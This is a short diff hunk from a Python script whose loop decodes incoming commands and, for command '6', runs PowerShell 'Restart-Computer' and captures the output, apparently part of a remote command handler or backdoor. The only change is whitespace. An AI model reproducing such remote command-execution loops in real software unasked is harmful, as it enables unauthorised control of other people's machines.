@@ -127,7 +127,7 @@ while True:
                 
         elif decoded_data[0] == '6':
             cmd = subprocess.Popen([powershell_exe, "Restart-Computer"],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-            
+                
         
 
         output_byte = cmd.stdout.read() + cmd.stderr.read()
